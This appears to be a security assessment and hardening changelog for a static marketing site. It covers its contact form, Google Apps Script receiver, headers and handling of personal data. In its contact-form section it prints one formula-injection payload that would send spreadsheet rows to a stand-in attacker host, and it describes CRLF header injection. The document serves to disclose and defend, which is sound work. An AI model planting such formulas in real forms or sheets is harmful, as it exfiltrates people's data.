# Futr Markets — Security

Assessed **2 Oct 2026** against the production build, and re-assessed the same
day after the hardening pass described in §7.

## What this site actually is

A static single-page site. No server of our own, no database, no user accounts,
no authentication, no payments, no file uploads, no admin panel. Everything is
pre-built HTML, CSS, JS and media served from a CDN.

That matters, because it removes most of the categories people worry about.
There is no SQL to inject, no session to hijack, no privilege to escalate. The
realistic attack surface is four things:

1. The contact form — the only place a stranger can send us data
2. The dependency chain — what we pull from npm
3. The response headers — what the browser is told to allow
4. Personal data handling — we collect names, emails and phone numbers

Each is covered below, with what is done and what is still outstanding.

---

## 1. The contact form

The only input on the site, and the only thing here with a genuinely public,
unauthenticated endpoint behind it.

### Client side

| Control | How | Verified |
|---|---|---|
| **Honeypot** | A `website` field, positioned off-screen, `tabIndex={-1}`, inside `aria-hidden`. No human can reach it — by sight, by keyboard, or by screen reader. Anything in it came from a bot filling every input it found. | Bot submission → **0 network calls** |
| **Timing gate** | Submissions under 3 seconds from first keystroke are rejected. People read; scripts do not. | Instant submit → **0 network calls** |
| **Silent rejection** | Both checks tell the bot "Sent." Explaining *why* it was blocked just teaches whoever wrote it how to get past next time. | Status read back as success |
| **Honeypot never forwarded** | The field is destructured out before the payload is built, so it can never reach a backend, a Sheet or an inbox. | Stored payload contains no `website` key |
| **Field length caps** | `src/lib/contact-schema.js` defines one limit per field. Enforced by `maxLength` on the input, again in the store on every `setField`, and again in `clampToLimits` before send. | 50 000-char paste → clamped to 120 / 4 000 |
| **Double-submit guard** | A second press inside 4 s, or while a request is in flight, returns the success that already happened instead of sending again. | — |
| **Request timeout** | 15 s `AbortController` on every send, so a hanging endpoint cannot lock the UI. | — |
| **Endpoint scheme check** | The endpoint is read at runtime from a file edited by hand after handover. `isSafeEndpoint` accepts only absolute `https://`; `http:`, `javascript:`, `data:`, protocol-relative and bare paths are refused and fall back to `mailto`. | 10/10 cases pass |
| **No false success** | Success is shown only when a backend returns 2xx. A failed send is retained in `localStorage` and the user is handed a pre-filled `mailto` so the enquiry is not lost. | — |

### Server side (`scripts/google-apps-script.gs`)

This URL is deployed "Anyone" — it has to be, because a website visitor has no
Google login to present. So every client-side control above is assumed skipped.

| Control | Why it is there |
|---|---|
| **Spreadsheet formula injection defence** | **The most serious issue found.** `appendRow` *parses* what it is given, so a name of `=IMPORTXML("https://evil.test?x="&CONCATENATE(A1:I1),"//a")` was stored as a live formula and would run — shipping the row, or the sheet, to an attacker's server — the moment anyone at Futr opened the tab. `=HYPERLINK` is the same trick as a phishing link that appears to come from the sender. Fixed by `setValuesAsText`, which sets the cell number format to `'@'` **before** writing, so Sheets stores characters instead of parsing them. |
| **Rate limit** | 20 accepted enquiries per 10-minute rolling window, site-wide, via `CacheService`. Apps Script never sees the caller's IP, so a per-sender limit is not possible; this protects the two things that actually matter — the sheet, and the daily `MailApp` quota, after which real enquiries arrive with no notification. |
| **Deduplication** | A SHA-256 of email+subject+message is cached for 120 s. A retry after a flaky response answers success without writing a second row. |
| **Concurrency lock** | `LockService` around the read-check-write, so two simultaneous posts cannot both pass the rate check or write over each other. |
| **Payload size cap** | Bodies over 32 kB are refused before `JSON.parse` runs. |
| **Type coercion** | A field that is an object or array becomes `''` rather than the literal text `[object Object]`. |
| **Control-character stripping** | CR/LF is removed from every single-line field. A bare CRLF in `subject` is how a sender tries to append its own headers to the notification email. Newlines survive only in `message`, where they are content. |
| **Email validation** | Guards the `replyTo` header. Previously unvalidated — a malformed address threw inside `MailApp`, which was caught and reported as a *failed submission*, after the row had already been written, so the client retried and stored it twice. |
| **Notification decoupled from storage** | A mail failure is logged, never reported as a failed submission, for the same reason. |
| **Generic error responses** | Internal errors are logged server-side; the response says "Could not store enquiry". Returning `String(err)` disclosed sheet names and script internals. |

Regression-tested by `npm test` (22 assertions, no dependencies).

**Not implemented: CAPTCHA.** The checks above stop commodity spam bots at zero
cost to real users. A CAPTCHA is a real accessibility and conversion tax, and
this form is low-value to attack. If spam volume ever becomes a genuine problem,
add Cloudflare Turnstile (invisible for most users) rather than reCAPTCHA.

**If you switch provider away from `sheets`**, every server-side control in the
table above goes with it. Formspree and Web3Forms have their own rate limiting
and spam filtering — turn it on. A provider of type `endpoint` is your own code
and must re-implement all of it.

---

## 2. Dependencies

```
npm audit            → 0 vulnerabilities
npm audit --omit=dev → 0 vulnerabilities
```

Runtime dependencies are deliberately few: React, React Router, Zustand, GSAP,
Lenis. Three.js remains installed but is **tree-shaken out of the bundle**
entirely since the hero moved to video — it ships nothing today.

**Ongoing:** re-run `npm audit` before every deploy. Most real-world compromises
of static sites arrive through a transitive dependency, not through the site's
own code.

---

## 3. Response headers

This is the one area a static site genuinely needs configuring, because the
host — not the bundle — sends these.

Shipped ready to use:

- **`public/_headers`** — Netlify / Cloudflare Pages
- **`vercel.json`** — Vercel

> These two files had drifted apart: `_headers` denied `interest-cohort`,
> `vercel.json` did not, and only `_headers` set the `index.html` cache rule.
> They are now identical in effect. **Change one, change the other in the same
> commit** — there is no build step that checks this.

Both set:

| Header | Why |
|---|---|
| `Content-Security-Policy` | Limits what can execute or be loaded. The single most valuable header here: if a dependency is ever compromised, this is what stops it calling home. |
| `Strict-Transport-Security` | Forces HTTPS for two years. |
| `X-Content-Type-Options: nosniff` | Stops the browser guessing a response is a script. |
| `X-Frame-Options: DENY` + `frame-ancestors 'none'` | Clickjacking. |
| `Referrer-Policy` | Keeps our URLs out of third-party referer logs. |
| `Permissions-Policy` | Denies camera, mic, geolocation, payment, USB, FLoC — nothing here uses them. |
| `Cross-Origin-Opener-Policy: same-origin` | Puts the document in its own browsing-context group, so a page we open can never reach `window.opener`. Makes structural what every link currently has to remember with `rel="noopener"`. |
| `Cross-Origin-Resource-Policy: same-origin` | Refuses to be loaded as a subresource by another origin. `/og.jpg` is the one deliberate `cross-origin` exception — it exists to be fetched by other people. |

### Three CSP notes worth knowing

- **`style-src` needs `'unsafe-inline'`.** The design system sets per-element
  transition delays through React's `style` prop, which produces style
  attributes. Removing this would mean pre-generating a class for every delay.
  The risk is low — style injection cannot execute script — but it is a real
  compromise and you should know it was deliberate.

- **`connect-src` lists every provider `public/config.json` can be switched
  to**, because that switch is documented as not needing a rebuild, and a
  provider the policy does not allow is a provider whose enquiries all fail.
  That is a deliberate widening: **delete the lines you are not using.** Each
  one is an origin a compromised dependency could post to.

- **`frame-src`, `worker-src` and `manifest-src` are named explicitly** even
  though `default-src` already covers them. Naming them means adding an iframe
  or a worker later is a deliberate edit to this policy rather than something
  that quietly inherits a permission.

**If hosting somewhere else** (nginx, Apache, S3+CloudFront), copy the same
header set across. Verify afterwards at <https://securityheaders.com>.

---

## 4. Personal data

The form collects **name, company, email, phone and a free-text message**. That
is personal data under India's DPDP Act and under GDPR for any EU visitor.

**Local retention is now bounded.** Failed sends are held in `localStorage` so a
network blip does not lose an enquiry — but that record is the complete
enquiry, readable by any script on the origin, surviving browser restarts. It
was kept indefinitely, up to 50 entries. It is now capped at 20 and purged after
7 days, enforced on read as well as on write.

Outstanding, and genuinely blocking for launch:

- [ ] **Privacy Policy content.** The page is structured but the clauses are
      empty. It must state who the data controller is, what is collected, why,
      how long it is kept, who it is shared with, and how to request deletion.
      This needs Futr's actual position — it cannot be invented.
- [ ] **A consent line on the form.** One sentence near the submit button
      saying what happens to the data and linking to the policy.
- [ ] **Retention.** Decide how long enquiries are kept *in the Sheet* and who
      can see them. A Google Sheet shared company-wide is a real exposure as it
      fills up — and note that anyone with edit access can also undo the
      formula-injection defence by reformatting a column.
- [ ] **Where the data lives.** If the client has Indian data-residency
      expectations, note that Formspree and Web3Forms store submissions on US
      infrastructure. Google Apps Script keeps it in Futr's own Drive, which is
      the cleanest answer on that front.

---

## 5. Things checked and found clean

| Check | Result |
|---|---|
| `dangerouslySetInnerHTML` | 0 occurrences |
| `innerHTML`, `eval`, `new Function`, `document.write` | 0 occurrences |
| XSS via rendered content | React escapes by default; no raw HTML rendering anywhere |
| Secrets in the production bundle | Scanned for API keys, AWS keys, Google keys, bearer tokens, private key blocks — **none** |
| `target="_blank"` without `rel` | Every external link carries `rel="noreferrer noopener"`; now also enforced centrally in `Polymorphic` |
| Unsafe link schemes | `Polymorphic` allows only `http(s)`, `mailto:` and `tel:`. Nothing is dynamic today, so nothing was exploitable — the check exists so that the first href built from config or a CMS is safe by default |
| Mixed content | No `http://` resource URLs; the only matches are SVG namespace declarations |
| Dependency vulnerabilities | 0 |

### A note on `VITE_` variables

Anything named `VITE_*` is **inlined into the JavaScript bundle at build time
and is publicly readable**. This was verified during testing: a test endpoint
set in `.env` appeared verbatim in `dist/assets/*.js`.

That is fine for a form endpoint URL or a provider's public access key — those
are designed to be public. It is **never** acceptable for an API secret, a
database URL, an SMTP password or a private key. `.env.example` carries this
warning at the top.

---

## 6. Priority order

**Before launch**

1. Privacy Policy content + a consent line on the form
2. Pick a form backend and configure it (see `public/config.json`) — until then
   every enquiry depends on the visitor having a working mail client
3. If using `sheets`: set `NOTIFY_TO` and redeploy the Apps Script, so the
   hardened version in §1 is the one actually running
4. Confirm the host is actually sending the headers (securityheaders.com)
5. Trim `connect-src` to the one provider you chose
6. Decide enquiry retention and who has access

**Ongoing**

7. `npm audit` and `npm test` before each deploy
8. Watch form submissions for spam; add Turnstile only if it becomes real
9. Keep `connect-src`, `_headers` and `vercel.json` in step with each other

---

## 7. Changelog — hardening pass, 2 Oct 2026

Fixed in this pass, highest severity first:

1. **Spreadsheet formula injection** in the Apps Script receiver (§1). The only
   finding here with a path to data exfiltration.
2. **No rate limiting, deduplication or locking** on a public unauthenticated
   endpoint — sheet flooding and mail-quota exhaustion.
3. **Notification failure reported as submission failure** after the row was
   written, causing duplicate enquiries on retry.
4. **Internal error messages returned to the caller.**
5. **No server-side email validation or type coercion**; no payload size cap.
6. **No field length limits anywhere** — client or server advertised none.
7. **Unvalidated runtime endpoint** — a hand-edited `config.json` could point
   enquiries at a plaintext `http://` URL.
8. **Unbounded PII retention** in `localStorage`.
9. **Header drift** between `_headers` and `vercel.json`; missing COOP/CORP and
   explicit `frame-src`/`worker-src`/`manifest-src`.
10. **No scheme allowlist** on the link primitive (defence in depth; nothing
    was exploitable at the time).
